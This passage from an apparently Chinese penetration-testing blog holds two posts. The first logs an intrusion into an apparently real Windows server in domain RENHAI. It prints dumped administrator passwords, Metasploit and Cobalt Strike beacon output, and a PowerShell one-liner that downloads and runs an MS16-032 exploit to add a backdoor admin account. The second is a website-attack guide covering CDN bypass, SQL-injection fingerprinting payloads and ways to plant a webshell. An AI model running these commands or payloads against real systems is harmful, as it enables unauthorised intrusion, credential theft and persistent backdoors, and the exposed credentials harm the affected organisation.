class="number">2</span>a40e70e764833f30c1c804f5709dba2</span><br><span class="line"> * SHA1     : aa34ec6af75a3813a158c3e95a475602f25b5a34</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : RENHAI</span><br><span class="line"> * Password : <span class="number">168</span>renhai</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : RENHAI</span><br><span class="line"> * Password : <span class="number">168</span>renhai</span><br></pre></td></tr></table></figure><p>接下来就等着晚上上线管理员了。</p><p>然后我们接着看一下msf使用ms16这个洞报错的原因，首先目标系统是肯定有ps的。再一次启动msf查看报错信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 164.155.95.55:4444 </span><br><span class="line">[+] Compressed size: 1016</span><br><span class="line">[*] Writing payload file, C:\DOCUME~1\good\LOCALS~1\Temp\1\VcDqmVnyed.ps1...</span><br><span class="line">[*] Compressing script contents...</span><br><span class="line">[+] Compressed size: 3596</span><br><span class="line">[*] Executing exploit script...</span><br><span class="line">[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out.</span><br><span class="line">[-] run: Interrupted</span><br></pre></td></tr></table></figure><p>可以看到ps文件存在于<code>C:\DOCUME~1\good\LOCALS~1\Temp\1\VcDqmVnyed.ps1..</code>。我们到目标机器下面查看一下。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/37091F23-13E7-4DBF-895B-A4E4F598F4CC.png" alt="37091F23-13E7-4DBF-895B-A4E4F598F4CC"></p><p>可以看到目标系统上传了ps文件。我们直接使用ps执行ps脚本，发现报红而且闪退。大概这就是msf不能正常使用的原因吧。管理员权限不能使用ps，接着我们晚上偷摸的登录管理员用户，这时候就是system权限，然后调用ps。运行对应的脚本发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News\Invoke-MS16-032.ps1 檔案無法載入，因為這個系</span><br><span class="line">統上已停用指令碼執行。如需詳細資訊，請參閱 &quot;get-help about_signing&quot;。</span><br><span class="line">位於 行:1 字元:55</span><br><span class="line">+ D:\S_JCIN\WebSite\OutWeb\L_CT\News\Invoke-MS16-032.ps1 &lt;&lt;&lt;&lt;</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [], PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : RuntimeException</span><br></pre></td></tr></table></figure><p>这是由于powershell的默认执行权限为<code>Restricted：脚本不能运行（默认设置）</code>。</p><p>查看一下当前powershell的默认执行权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Documents and Settings\Administrator&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><p>设置一下权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Documents and Settings\Administrator&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br><span class="line">PS C:\Documents and Settings\Administrator&gt; Set-ExecutionPolicy Unrestricted</span><br><span class="line"></span><br><span class="line">執行原則變更</span><br><span class="line">執行原則有助於防範您不信任的指令碼。如果變更執行原則，可能會使您接觸到</span><br><span class="line">about_Execution_Policies 說明主題中所述的安全性風險。您要變更執行原則嗎?</span><br><span class="line">[Y] 是(Y)  [N] 否(N)  [S] 暫停(S)  [?] 說明 (預設值為 &quot;Y&quot;): y</span><br><span class="line">PS C:\Documents and Settings\Administrator&gt; Get-ExecutionPolicy</span><br><span class="line">Unrestricted</span><br><span class="line">PS C:\Documents and Settings\Administrator&gt;</span><br></pre></td></tr></table></figure><p>这时候可以运行powershell脚本。</p><p>然后在管理员用户下运行cs马，反弹一个shell这时候就是system权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; sleep 0</span><br><span class="line">[*] Tasked beacon to become interactive</span><br><span class="line">[+] host called home, sent: 16 bytes</span><br><span class="line">beacon&gt; shell whoami</span><br><span class="line">[*] Tasked beacon to run: whoami</span><br><span class="line">[+] host called home, sent: 37 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">renhai\administrator</span><br></pre></td></tr></table></figure><h5 id="ps提权"><a href="#ps提权" class="headerlink" title="ps提权"></a>ps提权</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Documents and Settings\good&gt; powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https</span><br><span class="line">:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Ridter&#x2F;Pentest&#x2F;master&#x2F;powershell&#x2F;MyShell&#x2F;Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application</span><br><span class="line"> cmd.exe -commandline &#39;&#x2F;c net localgroup administrators gust &#x2F;add&#39;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 8</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[?] Done, got 2 thread handle(s)!</span><br><span class="line"></span><br><span class="line">[?] Thread handle list:</span><br><span class="line">1604</span><br><span class="line">2424</span><br><span class="line"></span><br><span class="line">[*] Sniffing out privileged impersonation token..</span><br><span class="line"></span><br><span class="line">[?] Trying thread handle: 1604</span><br><span class="line">[?] Thread belongs to: svchost</span><br><span class="line">[+] Thread suspended</span><br><span class="line">[&gt;] Wiping current impersonation token</span><br><span class="line">[&gt;] Building SYSTEM impersonation token</span><br><span class="line">[?] Success, open SYSTEM token handle: 2420</span><br><span class="line">[+] Resuming thread..</span><br><span class="line"></span><br><span class="line">[*] Sniffing out SYSTEM shell..</span><br><span class="line"></span><br><span class="line">[&gt;] Duplicating SYSTEM token</span><br><span class="line">[&gt;] Starting token race</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">PS C:\Documents and Settings\good&gt; net localgroup administrators</span><br><span class="line">別名     administrators</span><br><span class="line">註解     Administrators 可以完全不受限制地存取電腦&#x2F;網域</span><br><span class="line"></span><br><span class="line">成員</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">banli$</span><br><span class="line">good</span><br><span class="line">Guest</span><br><span class="line">gust</span><br><span class="line">IUSR_TELNET</span><br><span class="line">TelNet</span><br><span class="line">命令執行成功。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入漏洞手注练习&quot;&gt;&lt;a href=&quot;#SQL注入漏洞手注练习&quot; class=&quot;headerlink&quot; title=&quot;SQL注入漏洞手注练习&quot;&gt;&lt;/a&gt;SQL注入漏洞手注练习&lt;/h1&gt;&lt;h2 id=&quot;Exp1&quot;&gt;&lt;a href=&quot;#Exp1&quot; class=&quot;</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>一个网站的渗透思路</title>
    <link href="http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
    <id>http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</id>
    <published>2020-10-23T13:21:43.000Z</published>
    <updated>2020-12-01T01:02:41.852Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一个网站的渗透思路"><a href="#一个网站的渗透思路" class="headerlink" title="一个网站的渗透思路"></a>一个网站的渗透思路</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>信息收集网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.shodan.io&#x2F;</span><br></pre></td></tr></table></figure><h5 id="判断网站是否存在cdn"><a href="#判断网站是否存在cdn" class="headerlink" title="判断网站是否存在cdn"></a>判断网站是否存在cdn</h5><ul><li><p>什么是cdn？</p><p>CDN的全称是Content Delivery Network，即内容分发网络。其目的是通过在现有的internet中增加一层新的网络架构，将网站的内容发布到最接近用户的网络边缘，使用户可以就近取得所需的内容，提高用户访问网站的响应速度。</p><p>具体流程为: 用户在自己的浏览器中输入要访问的网站的域名，浏览器向本地DNS请求对该域名的解析，本地DNS将请求发到网站的主DNS，主DNS根据一系列的策略确定当时最适当的CDN节点，并将解析的结果（IP地址）发给用户，用户向给定的CDN节点请求相应网站的内容。</p></li><li><p>为什么要绕过cdn？</p><p>由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p></li><li><p>判断是否有cdn的方式</p><ul><li><p>Nslookup命令–查看是否返回多个IP，如果返回多个IP则表示存在CDN，否则可能不存在CDN。</p><p>可以看到有多个IP。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nslookup jd.com</span><br><span class="line">Server:114.114.114.114</span><br><span class="line">Address:114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:jd.com</span><br><span class="line">Address: 111.13.149.108</span><br><span class="line">Name:jd.com</span><br><span class="line">Address: 120.52.148.118</span><br><span class="line">Name:jd.com</span><br><span class="line">Address: 118.193.98.63</span><br></pre></td></tr></table></figure></li><li><p>使用在线网站查看–如果有多个IP则存在CDN，如果只有一个IP则不存在CDN</p><p>常见网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爱站:     https:&#x2F;&#x2F;ping.aizhan.com&#x2F;</span><br><span class="line">站长之家:  http:&#x2F;&#x2F;ping.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>使用工具直接查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ipip.net&#x2F;ip.html</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="绕过CDN的方式"><a href="#绕过CDN的方式" class="headerlink" title="绕过CDN的方式"></a>绕过CDN的方式</h5><ul><li><p>查找子域名</p><p>因为CDN架设需要钱，所以有的站点只给主域名架上CDN，而子域名一般不架设CDN。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.oneforall 查找子域名</span><br><span class="line">2、Google hacker 查找子域名</span><br><span class="line">3、site:baidu.com -www</span><br></pre></td></tr></table></figure></li><li><p>让服务器主动给我们发送邮箱，邮箱系统很多都在内部，没有经过解析，可以在邮件源码里面找到服务的真实的</p></li><li><p>历史DNS记录</p><p>查询ip与域名绑定历史记录，会发现使用cdn之前的目标ip。</p><p>使用网站查询之前绑定的域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ip138.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnsdb.io&#x2F;zh-cn&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;x.threatbook.cn&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;sitereport.netcraft.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;viewdns.info&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.17ce.com&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>利用网站漏洞</p><p>phpinfo敏感信息泄漏等等，如果存在web漏洞让服务器主动向我们请求链接，我们可以获取目标站点的真实ip。</p><p>可以尝试反弹shell到我们的主机。</p></li><li><p>cert证书查询</p><p>转化成十进制,使用fofa搜索。</p><p>fofa语法–<code>cert=&quot;十进制&quot;</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111235353259.png" alt="image-20201111235353259"></p></li><li><p>在国外ping–网站在国外没有CDN</p><p>使用国外的网站ping</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;en&#x2F;ping.php</span><br></pre></td></tr></table></figure></li><li><p>绕过之后开始渗透</p><p>把真实的ip与目标域名在hosts文件中绑定。</p><p>或者直接访问目标的ip而不是访问域名。</p></li></ul><h5 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h5><ul><li><p>使用burp抓包、放包，在返回包中可以看到使用的系统、脚本语言、服务类型以及waf类型等等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;gb2312</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Server: Microsoft-IIS&#x2F;8.5</span><br><span class="line">X-Powered-By: WAF&#x2F;2.0</span><br><span class="line">Date: Mon, 21 Sep 2020 12:02:33 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 9173</span><br></pre></td></tr></table></figure></li><li><p>使用谷歌插件–Wappalyzer 查看网站的基本信息，比如web服务、脚本语言等等。</p></li><li><p>判断数据库类型</p><p>数据库本身的特性</p><ul><li>access数据库，数据库文件后缀为.mdb，一般配合的脚本语言为asp。为小型数据库。</li><li>SQL Server数据库，数据库文件后缀为.mdf，一般配合的脚本语言为asp。端口号为1433。</li><li>mysql数据库，数据库后缀文件为,sql，一般配合的脚本语言为php，端口号为3306。</li><li>Oracle数据库，端口号为1521。</li></ul><p>sql注入判断数据库类型</p><ul><li><p>特有的函数</p><ul><li><p>通过使用查看数据库版本的函数，比如mysql的version()、@@version函数</p></li><li><p>substring和substr</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在mssql、mysql中可以调用substring。oracle则只可调用substr</span><br></pre></td></tr></table></figure></li><li><p>其他的一些函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql server: @@pack_received @@rowcount</span><br><span class="line">mysql:connection_id() last_insert_id() row_count()</span><br><span class="line">orcale:bitand(1,1)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>对字符串的处理方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sql server ：id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; --</span><br><span class="line">mssql:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39;</span><br><span class="line">mysql:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; ， &#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br><span class="line">oracle:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ，&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br><span class="line">postgresql :id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ,&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br></pre></td></tr></table></figure></li><li><p>特殊符号以及注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">“&#x2F;*”是MySQL中的注释符，返回错误说明该注入点不是MySQL</span><br><span class="line">“--”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一，mysql中的注释为&#96;-- &#96;，注意后面有空格。</span><br><span class="line">“;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库</span><br></pre></td></tr></table></figure></li><li><p>根据返回的报错类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ORACLE</span><br><span class="line">ORA-01756:quoted string not properly terminated</span><br><span class="line">ORA-00933:SQLcommand not properly ended</span><br><span class="line">MS-SQL</span><br><span class="line">Msg 170,level 15, State 1,Line 1</span><br><span class="line">Line 1:Incorrect syntax near ‘foo</span><br><span class="line">Msg 105,level 15,state 1,Line 1</span><br><span class="line">Unclose quotation mark before the character string ‘foo</span><br><span class="line">MYSQL</span><br><span class="line">you have an error in your SQL syntax,check the manual that corresponds to you mysql server version for the right stntax to use near ‘’foo’ at line x</span><br></pre></td></tr></table></figure></li><li><p>各个数据库特有的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、mssql数据库</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">2、access数据库</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from msysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">3、mysql数据库(mysql版本在5.0以上)</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</span><br><span class="line">4、oracle数据库</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>dirsearch、dirmap、dirb、御剑扫描工具。</p><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>namp、Masscan、msf</p><h5 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h5><ul><li><p>oneforall、知道创宇实验室ksubdomain</p></li><li><p>谷歌hacker语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com -www</span><br></pre></td></tr></table></figure></li></ul><h5 id="判断网站CMS类型"><a href="#判断网站CMS类型" class="headerlink" title="判断网站CMS类型"></a>判断网站CMS类型</h5><ul><li><p>cms特有的文件路径</p><p>比如WordPress的常用路径为wp-admin等等。</p></li><li><p>robots.txt文件中会列出一些禁止爬的目录。</p></li><li><p>查看版权信息</p><ul><li>网页的最底部可能会有版权信息。</li><li>网页前台的源代码中可能会有注释的版权信息。</li></ul></li></ul><h5 id="常见的cms扫描工具"><a href="#常见的cms扫描工具" class="headerlink" title="常见的cms扫描工具"></a>常见的cms扫描工具</h5><p>WordPress的专用扫描工具，wpscan。</p><p>CMSmap可以扫描WordPress，Joomla和Drupal。</p><p>判断出CMS之后可以搜索以往的cms漏洞，或者找到源码审计一下。</p><h5 id="操作系统的判断"><a href="#操作系统的判断" class="headerlink" title="操作系统的判断"></a>操作系统的判断</h5><ul><li><p>nmap 参数-O表示扫描操作系统信息</p></li><li><p>ping命令 </p><p>TTL起始值:</p><p>Windows xp 128 (广域网中TTL为65-128)</p><p>Linux/Unix64(广域网中TTL为1-64)</p></li><li><p>大小写</p><p>Linux系统对大小写敏感</p><p>window系统对大小写不敏感</p></li></ul><h5 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h5><p>goby批量信息收集</p><p>w8fuckcdn 通过扫描全网绕过CDN获取网站IP地址</p><h4 id="网站CMS"><a href="#网站CMS" class="headerlink" title="网站CMS"></a>网站CMS</h4><h5 id="owasp-top-10漏洞挖掘"><a href="#owasp-top-10漏洞挖掘" class="headerlink" title="owasp top 10漏洞挖掘"></a>owasp top 10漏洞挖掘</h5><ul><li><p>sql注入漏洞</p></li><li><p>逻辑漏洞</p><p>支付漏洞</p><ul><li><p>任意金额修改</p><p>利用：抓包直接修改金额，可减少支付金额，也可修改为负的金额。</p><p>防御：</p><p>1、将商品ID和订单金额进行哈希加密，当用户修改金额之后再一次进行哈希加密并与原本的哈希值进行比较。</p><p>2、敏感参数不要放在url中。</p></li><li><p>请求重放</p><p>利用：</p><p>购买成功后，重放其中请求，竟然可以使购买商品一直增加。</p></li></ul><p>cookie缺陷</p><ul><li>token可以获取(前端爬虫)</li><li>cookie重复利用</li><li>cookie可枚举</li><li>cookie使用简单的加密算法</li></ul><p>验证码漏洞</p><ul><li><p>验证码绕过</p><p>原因：直接让验证码参数值为空，或者直接删掉验证码参数名，可导致绕过。</p></li><li><p>验证码回显</p><p>原因：验证码由前端即客户端生成，可在请求包中直接获取验证码。比如，前端源码、cookie中存在验证码。</p><p>利用：利用脚本提取验证码，直接暴力破解。</p><p>防御：</p><p>1、后端生成验证码。</p></li><li><p>验证码重复利用与验证码暴力破解</p></li><li><p>绕过防暴力破解</p><ul><li><p>限制IP</p><p>X-Forwarded-For绕过</p><p>在请求包中增加XFF报头即可，然后使用burp并将其也设置为一个intruder payload即可。</p></li><li><p>服务端只对失败次数进行了校验，当登录成功之后失败次数清0.</p><p>注册一个用户，将注册的用户(知道密码，成功登录之后会清零登录限制次数)与要暴力破解的用户放在一起。比如：正常用户steady，其他测试用户boy、sadjh、sadkh。可以生成一下字典：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">steady</span><br><span class="line">  boy</span><br><span class="line">  boy</span><br><span class="line">  sadjh</span><br><span class="line">  steady</span><br><span class="line">  steady</span><br><span class="line">  boy</span><br><span class="line">  boy</span><br><span class="line">  sadjh</span><br><span class="line">  steady</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>越权漏洞</p><ul><li>水平越权与垂直越权</li></ul><p>密码找回漏洞</p><ul><li><p>sql注入漏洞</p></li><li><p>某些字符标志可以组成url直接跳过验证</p></li><li><p>修改响应包</p><p>发送请求包，然后让响应包作为请求包，修改其中的敏感信息，然后再次发包。</p></li><li><p>跳过验证步骤(常见参数step)</p><ul><li>修改某些参数，可跳过认证步骤。</li></ul></li><li><p>替换用户账号或用户表示(uid、手机号、账号)</p><ul><li>两个账户测试，先使用一个账户B找回，然后把账号修改为A，最终成功修改A的账号。也可以直接复制数据包，只修改某些用户表示。</li></ul></li><li><p>删除某些参数可直接绕过验证</p></li><li><p>用户凭证在返回包中</p><ul><li>用户发送请求包，可以直接看到token信息、验证码</li></ul></li></ul></li></ul><h5 id="常见GetShell方式"><a href="#常见GetShell方式" class="headerlink" title="常见GetShell方式"></a>常见GetShell方式</h5><h6 id="owasp-top-10漏洞拿shell"><a href="#owasp-top-10漏洞拿shell" class="headerlink" title="owasp top 10漏洞拿shell"></a>owasp top 10漏洞拿shell</h6><ul><li><p>sql注入拿shell</p><ul><li><p>sqlmap –os-shell</p></li><li><p>sql注入漏洞直接写入shell</p><p>联合注入、报错注入、堆叠注入</p></li><li><p>日志文件拿shell(可以配合堆叠注入)</p></li><li><p>sqlmap –sql-shell 能够执行sql语句之后，在写shell</p></li></ul></li><li><p>phpadmin拿shell</p><ul><li>日志文件拿shell</li><li>直接执行sql语句那shell</li></ul></li><li><p>命令执行拿shell</p><ul><li>直接写shell到目标文件夹下面</li><li>执行系统命令、调用脚本语言反弹shell</li></ul></li><li><p>文件上传拿shell</p><ul><li>直接上传shell文件</li><li>上传一个具有写shell功能的文件，访问文件直接写入shell</li><li>上传一个具有命令执行的文件，然后执行命令写shell</li></ul></li><li><p>文件包含漏洞拿shell</p><ul><li>远程包含文件，将shell写入站点。</li><li>包含session文件</li><li>phpinfo本地包含临时文件</li></ul></li></ul><h6 id="网站功能点上传shell"><a href="#网站功能点上传shell" class="headerlink" title="网站功能点上传shell"></a>网站功能点上传shell</h6><ul><li><p>后台上传插件拿shell</p></li><li><p>后台数据库备份拿shell</p><p>数据库备份拿shell就是把我们sql语句放入数据库备份文件中,然后上传到服务器,服务器执行sql数据库备份文件进而执行我们的sql语句 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;一句话&quot; into outfile “路径”</span><br></pre></td></tr></table></figure><p>这里的路径一定要是全路径,不能只是一个文件名,如果只写相对路径或者文件名,文件会存储到服务器中的mysql所在的文件夹中</p></li><li><p>后台编辑前台模版文件拿shell</p></li><li><p>其他漏洞挖掘方式</p><ul><li><code>www.xxx.com\www.xxx.com.zip|rar</code>直接拖源码</li></ul></li></ul><h5 id="常见端口利用"><a href="#常见端口利用" class="headerlink" title="常见端口利用"></a>常见端口利用</h5><h6 id="11211端口–memcache"><a href="#11211端口–memcache" class="headerlink" title="11211端口–memcache"></a>11211端口–memcache</h6><p>漏洞介绍</p><p>Memcached 是一套常用的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公网开放的 Memcache 服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。</p><p>漏洞利用</p><p>telnet直接连接目标端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 